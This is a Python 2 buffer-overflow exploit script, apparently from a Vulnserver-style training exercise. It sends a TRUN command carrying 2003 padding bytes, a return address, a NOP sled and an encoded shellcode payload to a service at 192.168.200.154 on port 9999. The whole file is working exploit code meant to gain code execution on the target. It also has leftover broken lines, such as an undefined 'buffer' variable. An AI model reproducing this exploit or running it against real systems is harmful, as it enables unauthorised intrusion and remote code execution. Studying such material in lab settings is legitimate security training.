#!/usr/bin/python
import sys, socket
from time import sleep

overflow = ("\xbb\xb6\x08\xf3\x76\xdb\xd3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\x5c\xf4\x11\x83\x5c\xed\x54"
"\x6c\x9c\xee\x38\xe4\x79\xdf\x78\x92\x0a\x70\x49\xd0\x5e\x7d"
"\x22\xb4\x4a\xf6\x46\x11\x7d\xbf\xed\x47\xb0\x40\x5d\xbb\xd3"
"\xc2\x9c\xe8\x33\xfa\x6e\xfd\x32\x3b\x92\x0c\x66\x94\xd8\xa3"
"\x96\x91\x95\x7f\x1d\xe9\x38\xf8\xc2\xba\x3b\x29\x55\xb0\x65"
"\xe9\x54\x15\x1e\xa0\x4e\x7a\x1b\x7a\xe5\x48\xd7\x7d\x2f\x81"
"\x18\xd1\x0e\x2d\xeb\x2b\x57\x8a\x14\x5e\xa1\xe8\xa9\x59\x76"
"\x92\x75\xef\x6c\x34\xfd\x57\x48\xc4\xd2\x0e\x1b\xca\x9f\x45"
"\x43\xcf\x1e\x89\xf8\xeb\xab\x2c\x2e\x7a\xef\x0a\xea\x26\xab"
"\x33\xab\x82\x1a\x4b\xab\x6c\xc2\xe9\xa0\x81\x17\x80\xeb\xcd"
"\xd4\xa9\x13\x0e\x73\xb9\x60\x3c\xdc\x11\xee\x0c\x95\xbf\xe9"
"\x73\x8c\x78\x65\x8a\x2f\x79\xac\x49\x7b\x29\xc6\x78\x04\xa2"
"\x16\x84\xd1\x65\x46\x2a\x8a\xc5\x36\x8a\x7a\xae\x5c\x05\xa4"
"\xce\x5f\xcf\xcd\x65\x9a\x98\x31\xd1\x6c\xfa\xda\x20\x6c\xea"
"\x46\xac\x8a\x66\x67\xf8\x05\x1f\x1e\xa1\xdd\xbe\xdf\x7f\x98"
"\x81\x54\x8c\x5d\x4f\x9d\xf9\x4d\x38\x6d\xb4\x2f\xef\x72\x62"
"\x47\x73\xe0\xe9\x97\xfa\x19\xa6\xc0\xab\xec\xbf\x84\x41\x56"
"\x16\xba\x9b\x0e\x51\x7e\x40\xf3\x5c\x7f\x05\x4f\x7b\x6f\xd3"
"\x50\xc7\xdb\x8b\x06\x91\xb5\x6d\xf1\x53\x6f\x24\xae\x3d\xe7"
"\xb1\x9c\xfd\x71\xbe\xc8\x8b\x9d\x0f\xa5\xcd\xa2\xa0\x21\xda"
"\xdb\xdc\xd1\x25\x36\x65\xf1\xc7\x92\x90\x9a\x51\x77\x19\xc7"
"\x61\xa2\x5e\xfe\xe1\x46\x1f\x05\xf9\x23\x1a\x41\xbd\xd8\x56"
"\xda\x28\xde\xc5\xdb\x78");

#shellcode = "A" * 2003 + "B" * 4 + badchars
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('192.168.200.154', 9999))
  s.send(('TRUN /.:/' + shellcode))
  s.close()
  # sleep(1)
  buffer = buffer + "A"*100
	
except:
  print "Fuzzing Crashed at %s bytes" % str(len(shellcode))
  sys.exit()

